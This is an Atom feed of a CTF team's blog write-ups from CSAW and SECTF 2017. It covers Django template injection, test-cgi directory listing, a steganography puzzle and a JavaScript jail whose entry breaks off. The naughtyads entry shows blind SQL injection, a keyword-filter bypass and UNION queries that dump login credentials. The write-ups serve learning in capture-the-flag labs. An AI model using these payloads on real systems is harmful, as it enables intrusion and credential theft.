<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2017-09-17T22:44:04.700Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Web] CSAW - Shia Labeouf-off</title>
    <link href="https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/"/>
    <id>https://teamrocketist.github.io/2017/09/17/Web-CSAW-Shia-Labeouf-off/</id>
    <published>2017-09-17T21:27:02.000Z</published>
    <updated>2017-09-17T22:44:04.700Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Web<br>Shia Labeouf-off!<br><br>Do it<br><br>Just do it<br><br>Don’t let your dreams be dreams<br><br>Yesterday you said tomorrow<br><br>So just do it<br><br>Make your dreams come true<br><br>Just do it<br><br>Pick 1: <a href="http://web.chal.csaw.io:5487" target="_blank" rel="external">http://web.chal.csaw.io:5487</a> <a href="http://web.chal.csaw.io:5488" target="_blank" rel="external">http://web.chal.csaw.io:5488</a> <a href="http://web.chal.csaw.io:5489" target="_blank" rel="external">http://web.chal.csaw.io:5489</a> <a href="http://web.chal.csaw.io:5490" target="_blank" rel="external">http://web.chal.csaw.io:5490</a><br></blockquote>

<p>First of all great shout outs to CSAW for publishing a django challenge, even if it wasn’t a very hard one it was fun to do it.<br>Now going to the challenge, we know we have django debug mode enabled so lets try to generate some errors in the available webpages to see if we can leak some source code for example if we give an id in polls url we generate an exception:</p>
<p><img src="https://i.imgur.com/xSLaeEE.png" alt=""></p>
<p>If we scroll down a little bit and check those hidden tabs, we can find some leaked source code!<br><img src="https://i.imgur.com/lGE0ewJ.png" alt=""></p>
<p>We have some nice custom made template filter tags! in django you can create custom tags and use it on templates, we have a function that lists the attributes(<code>listme</code>) of a python object one that gets attributes(<code>getme</code>):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='getme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getme</span><span class="params">(value, arg)</span>:</span></div><div class="line">  <span class="keyword">return</span> getattr(value, arg)</div><div class="line"></div><div class="line"><span class="meta">@register.filter(name='checknum')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checknum</span><span class="params">(value)</span>:</span></div><div class="line">  check(value)</div><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">return</span> dir(value)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">if</span> value &gt; <span class="number">2</span>:</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">"Our infrastructure can't support that many Shias!"</span>)</div></pre></td></tr></table></figure>
<p>Now we need to find a Server-Side Template Injection (SSTI) so we can use this useful filters we can inject code with: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&#123;% expressions %&#125;</div><div class="line">&#123;&#123; arg1|filter:arg2 &#125;&#125;</div></pre></td></tr></table></figure>
<p>we can find one at <a href="http://web.chal.csaw.io:5490/ad-lib/" target="_blank" rel="external">http://web.chal.csaw.io:5490/ad-lib/</a> lets try to see the contents of debug variable:</p>
<h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><p><img src="https://i.imgur.com/kpSR61D.png" alt=""></p>
<h4 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h4><p><img src="https://i.imgur.com/FGjThVh.png" alt=""></p>
<p>Yap it works! the global debug leak alot of variables, mrpoopy object is interesting! lets check its attributes lets check its attributes with the filter <code>listme</code></p>
<h4 id="Query-1"><a href="#Query-1" class="headerlink" title="Query"></a>Query</h4><p><img src="https://i.imgur.com/q2lkMWY.png" alt=""></p>
<h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><p><img src="https://i.imgur.com/vfBMY9u.png" alt=""></p>
<p>The flag must be in <code><strong>flag</strong></code>!! we need now to get this attribute with <code>getme</code> filter!</p>
<h4 id="Query-2"><a href="#Query-2" class="headerlink" title="Query"></a>Query</h4><p><img src="https://i.imgur.com/yzNX42T.png" alt=""></p>
<h4 id="Response-1"><a href="#Response-1" class="headerlink" title="Response"></a>Response</h4><p><img src="https://i.imgur.com/adBD7A4.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Web&lt;br&gt;Shia Labeouf-off!&lt;br&gt;&lt;br&gt;Do it&lt;br&gt;&lt;br&gt;Just do it&lt;br&gt;&lt;br&gt;Don’t let your dreams be dreams&lt;br&gt;&lt;br&gt;Yesterday you said tom
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
    
      <category term="ssti" scheme="https://teamrocketist.github.io/tags/ssti/"/>
    
      <category term="django" scheme="https://teamrocketist.github.io/tags/django/"/>
    
  </entry>
  
  <entry>
    <title>[Web] SECTF - Sprinkler system</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Web-SECTF-Sprinkler-system/</id>
    <published>2017-09-15T19:36:03.000Z</published>
    <updated>2017-09-15T19:47:05.449Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Sprinkler system - Web (100 + 0)<br><br>Damn new york… some chick tricked you into standing in the rain on the very first day… it’s payback time!<br><br>Solves: 238<br><br>Service: <a href="http://sprinklers.alieni.se/" target="_blank" rel="external">http://sprinklers.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>

<p>Starting by looking into robots.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://sprinklers.alieni.se/robots.txt'</span></div><div class="line">User-agent: *</div><div class="line">Disallow: /cgi-bin/<span class="built_in">test</span>-cgi</div></pre></td></tr></table></figure>
<p>We have a hidden directory /cgi-bin/test-cgi, my first instinct was to try shellshock but ofcourse it didn’t work so after a while searching in google I found this <a href="http://insecure.org/sploits/test-cgi.server_protocol.html" target="_blank" rel="external">http://insecure.org/sploits/test-cgi.server_protocol.html</a>.</p>
<p>To list the root directory we can do this:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">curl <span class="string">'http://sprinklers.alieni.se/cgi-bin/test-cgi?/*'</span></div><div class="line">CGI/1.0 <span class="built_in">test</span> script report:</div><div class="line"></div><div class="line">argc is 1. argv is /\*.</div><div class="line"></div><div class="line">SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)</div><div class="line">SERVER_NAME = sprinklers.alieni.se</div><div class="line">GATEWAY_INTERFACE = CGI/1.1</div><div class="line">SERVER_PROTOCOL = HTTP/1.1</div><div class="line">SERVER_PORT = 80</div><div class="line">REQUEST_METHOD = GET</div><div class="line">HTTP_ACCEPT = */*</div><div class="line">PATH_INFO = </div><div class="line">PATH_TRANSLATED = </div><div class="line">SCRIPT_NAME = /cgi-bin/<span class="built_in">test</span>-cgi</div><div class="line">QUERY_STRING = /app /bin /boot /dev /etc /git /home /lib /lib64 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var</div><div class="line">REMOTE_HOST =</div><div class="line">REMOTE_ADDR = 172.68.102.79</div><div class="line">REMOTE_USER =</div><div class="line">AUTH_TYPE =</div><div class="line">CONTENT_TYPE =</div><div class="line">CONTENT_LENGTH =</div></pre></td></tr></table></figure></p>
<p>Nothing special on the root directory lets try to list the current directory to instead of doing ?/<em> lets try ?</em> at the end of the url:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://sprinklers.alieni.se/cgi-bin/test-cgi?*'</span></div><div class="line">CGI/1.0 <span class="built_in">test</span> script report:</div><div class="line"></div><div class="line">argc is 1. argv is \*.</div><div class="line"></div><div class="line">SERVER_SOFTWARE = Apache/2.4.18 (Ubuntu)</div><div class="line">SERVER_NAME = sprinklers.alieni.se</div><div class="line">GATEWAY_INTERFACE = CGI/1.1</div><div class="line">SERVER_PROTOCOL = HTTP/1.1</div><div class="line">SERVER_PORT = 80</div><div class="line">REQUEST_METHOD = GET</div><div class="line">HTTP_ACCEPT = */*</div><div class="line">PATH_INFO = </div><div class="line">PATH_TRANSLATED = </div><div class="line">SCRIPT_NAME = /cgi-bin/<span class="built_in">test</span>-cgi</div><div class="line">QUERY_STRING = enable_sprinkler_system <span class="built_in">test</span>-cgi</div><div class="line">REMOTE_HOST =</div><div class="line">REMOTE_ADDR = 172.68.102.79</div><div class="line">REMOTE_USER =</div><div class="line">AUTH_TYPE =</div><div class="line">CONTENT_TYPE =</div><div class="line">CONTENT_LENGTH</div></pre></td></tr></table></figure>
<p>It works! there is a file named enable_sprinkler_system! lets see what is its content:<br><img src="https://i.imgur.com/0I4PAX0.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Sprinkler system - Web (100 + 0)&lt;br&gt;&lt;br&gt;Damn new york… some chick tricked you into standing in the rain on the very firs
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="cgi" scheme="https://teamrocketist.github.io/tags/cgi/"/>
    
      <category term="directorylisting" scheme="https://teamrocketist.github.io/tags/directorylisting/"/>
    
  </entry>
  
  <entry>
    <title>[Misc] SECTF - Joeys screenshot</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Misc-SECTF-Joeys-screenshot/</id>
    <published>2017-09-15T19:17:28.000Z</published>
    <updated>2017-09-15T19:32:12.930Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Joeys screenshot - Misc (50 + 0)<br><br>Joey gave me this screenshot to prove he got into The Gibson. Can you help us hack The Gibson too?<br><br>Solves: 69<br><br>Download: <a href="http://dl.ctf.rocks/joey.tar.gz" target="_blank" rel="external">http://dl.ctf.rocks/joey.tar.gz</a><br><br>Author: SecureLink / klondike<br><br></blockquote>

<p>Pretty simple one, this image had some strange hidden comments, I extracted them using <a href="https://github.com/zed-0xff/zsteg" target="_blank" rel="external">https://github.com/zed-0xff/zsteg</a>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line">$ zsteg chall.png</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 33 36                                          |_36             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 32 37                                          |327             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 43 32                                             |C2              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 31 33 34                                          |134             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 32 34                                          |524             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 4e 32 32                                          |N22             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 48 34 31                                          |H41             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 7b 34                                             |&#123;4              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 31                                          |_11             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 33 33                                          |_33             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 33                                          |_13             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 30 32 31                                          |021             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 45 31                                             |E1              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 33 30                                          |530             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 34 32                                          |342             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 48 34 33                                          |H43             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 30 33 38                                          |038             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 33 35                                          |535             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 50 32 36                                          |P26             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 55 32 35                                          |U25             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 47 33 37                                          |G37             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 34 31 35                                          |415             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 39                                             |39              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 42 31 39                                          |B19             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 53 30                                             |S0              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 55 32 39                                          |U29             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 52 32 38                                          |R28             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 52 33 32                                          |R32             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 31 34                                          |D14             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 32 31 32                                          |212             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 32 33                                          |_23             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 35                                             |D5              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 44 33 39                                          |D39             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 34 30                                          |_40             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 47 31 37                                          |G17             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 4b 38                                             |K8              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 59 31 30                                          |Y10             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 34 34                                          |344             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 21 34 35                                          |!45             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 35 32 30                                          |520             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 54 33                                             |T3              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 33 33 31                                          |331             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 31 31 38                                          |118             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 34 36                                             |46              |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 7d 34 36                                          |&#125;46             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 31 36                                          |_16             |</div><div class="line">meta Comment        .. </div><div class="line"></div><div class="line">    00000000: 5f 37                                             |_7              |</div></pre></td></tr></table></figure>
<p>After extracting them into a file I noticed the pattern behind it! if we get some comments we can see something familiar!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">S0</div><div class="line">E1</div><div class="line">C2</div><div class="line">T3</div><div class="line">&#123;4</div></pre></td></tr></table></figure>
<p>Yes! the first letter is a character from the flag and the order is the number after it! so lets write a python script to parse this and construct the flag!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">d = &#123;&#125;</div><div class="line">flag = <span class="string">''</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'notes.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">	l = f.read().split()</div><div class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> l:</div><div class="line">		d[s[<span class="number">1</span>:]] = s[<span class="number">0</span>]</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">47</span>):</div><div class="line">	flag += d[str(x)]</div><div class="line"><span class="keyword">print</span> flag</div></pre></td></tr></table></figure>
<p>A now running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python misc50.py </div><div class="line">SECT&#123;D4_K3Y_2_D4_G1B50N_5UP3RU53R_15_G0D_H3H3!&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Joeys screenshot - Misc (50 + 0)&lt;br&gt;&lt;br&gt;Joey gave me this screenshot to prove he got into The Gibson. Can you help us ha
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="misc" scheme="https://teamrocketist.github.io/tags/misc/"/>
    
      <category term="stego" scheme="https://teamrocketist.github.io/tags/stego/"/>
    
      <category term="zsteg" scheme="https://teamrocketist.github.io/tags/zsteg/"/>
    
      <category term="comments" scheme="https://teamrocketist.github.io/tags/comments/"/>
    
      <category term="puzzle" scheme="https://teamrocketist.github.io/tags/puzzle/"/>
    
  </entry>
  
  <entry>
    <title>[Web] SECTF - naughtyads</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Web-SECTF-naughtyads/</id>
    <published>2017-09-15T16:10:27.000Z</published>
    <updated>2017-09-15T16:47:39.463Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Naughty ads - Web (200 + 0)<br><br>Can you put agent Gill in the naughty ad section? His phone number is “555-31338”<br><br>Solves: 122<br><br>Service: <a href="http://naughtyads.alieni.se/" target="_blank" rel="external">http://naughtyads.alieni.se/</a><br><br>Author: avlidienbrunn<br><br></blockquote>

<p>Checking in robots.txt we have a hidden directory called admin, but there is a http authentication and we don’t know the user and the password, we need to find a vulnerability to get the credentials.</p>
<h3 id="Finding-the-vulnerability"><a href="#Finding-the-vulnerability" class="headerlink" title="Finding the vulnerability"></a>Finding the vulnerability</h3><p>Another Sql injection after some searching I found a GET param vulnerable to blind SQLi</p>
<p>Successful query that returns content :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='A</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/55vYxqN.png" alt=""></p>
<p>Unsuccessful query that returns nothing :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' AND 1 AND 'A'='B</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/exBhKMF.png" alt=""></p>
<hr>
<h3 id="Bypassing-filters"><a href="#Bypassing-filters" class="headerlink" title="Bypassing filters"></a>Bypassing filters</h3><p>Now there is some kind of protection, there is a filter blacklisting alot of SQL words, one way of bypassing it is by doing this:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// bypasses or filter</div><div class="line">http://naughtyads.alieni.se?id=3ad3-46c3-b975' <span class="comment">/*!50000or*/</span> 1 AND 'A'='A</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/5iPiplZ.png" alt=""></p>
<h3 id="Performing-Union-Injections"><a href="#Performing-Union-Injections" class="headerlink" title="Performing Union Injections"></a>Performing Union Injections</h3><p>Getting Table names:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(table_name) <span class="comment">/*!50000from*/</span> information_schema.tables <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/rL6GHpT.png" alt=""></p>
<p>Getting Columns names:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(column_name) <span class="comment">/*!50000from*/</span> information_schema.columns <span class="comment">/*!50000where*/</span> table_schema=database() AND '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/LHkGiYk.png" alt=""></p>
<p>Getting the Username and password</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://naughtyads.alieni.se/?id=3ad3-46c3-b97' <span class="comment">/*!50000union*/</span> <span class="comment">/*!50000all*/</span> <span class="comment">/*!50000select*/</span> group_concat(name, " ", password) <span class="comment">/*!50000from*/</span> login <span class="comment">/*!50000where*/</span> '1'='1</div></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/i72v18w.png" alt=""></p>
<p>After searching in google the hash 5ebe2294ecd0e0f08eab7690d2a6ee69 is secret</p>
<hr>
<h3 id="Admin-Login"><a href="#Admin-Login" class="headerlink" title="Admin Login"></a>Admin Login</h3><p>We have a simple form with a image upload well if we remember the challenge description:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</div></pre></td></tr></table></figure>
<p>So lets put the number and submit the form:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://naughtyads.alieni.se/admin/'</span> --user webmasterofdoom3755:secret --data <span class="string">'phone=555-31338'</span></div><div class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</div></pre></td></tr></table></figure>
<p>And we got the flag!!!</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;&lt;br&gt;Naughty ads - Web (200 + 0)&lt;br&gt;&lt;br&gt;Can you put agent Gill in the naughty ad section? His phone number is “555-31338”&lt;br&gt;
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="filterbypass" scheme="https://teamrocketist.github.io/tags/filterbypass/"/>
    
      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
    
      <category term="sqlinjection" scheme="https://teamrocketist.github.io/tags/sqlinjection/"/>
    
      <category term="httpauth" scheme="https://teamrocketist.github.io/tags/httpauth/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] SECTF - Jail 1</title>
    <link href="https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/"/>
    <id>https://teamrocketist.github.io/2017/09/15/Pwn-SECTF-Jail-1/</id>
    <published>2017-09-15T15:08:51.000Z</published>
    <updated>2017-09-15T18:26:44.857Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Jail - Pwn (200 + 0)<br><br>Joey gave you the disk with the file on it and now you’re in jail. They’re charging you with some serious shit, man! Better figure out a way to escape.<br><br>Solves: 43<br><br>Service: jail.alieni.se:55542<br><br>Author: avlidienbrunn<br><br></blockquote>

<p>A jail escape challenge this time with javascript we need, we can start by sending <code>this</code> so we can view the source code of the current function running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">_____________________________</div><div class="line">     ||   ||     ||   ||</div><div class="line">     ||   ||, , ,||   ||</div><div class="line">     ||  (||/|/(/||/  ||</div><div class="line">     ||  ||| _<span class="string">'_´|||  ||</span></div><div class="line"><span class="string">     ||   || o o ||   ||</span></div><div class="line"><span class="string">     ||  (||  - ´||)  ||</span></div><div class="line"><span class="string">     ||   ||  =  ||   ||</span></div><div class="line"><span class="string">     ||   ||\___/||   ||</span></div><div class="line"><span class="string">     ||___||) , (||___||</span></div><div class="line"><span class="string">    /||---||-\_/-||---||\</span></div><div class="line"><span class="string">   / ||--_||_____||_--|| \ </span></div><div class="line"><span class="string">  (_(||)-|S555-4202|-(||)_)</span></div><div class="line"><span class="string">|"""""""""""""""""""""""""""|</span></div><div class="line"><span class="string">| "You get one call, UNO."  |</span></div><div class="line"><span class="string"> """"""""""""""""""""""""""""</span></div><div class="line"><span class="string"> Phone #&gt; this</span></div></pre></td></tr></table></figure>
<p>And we get this source code:</p>
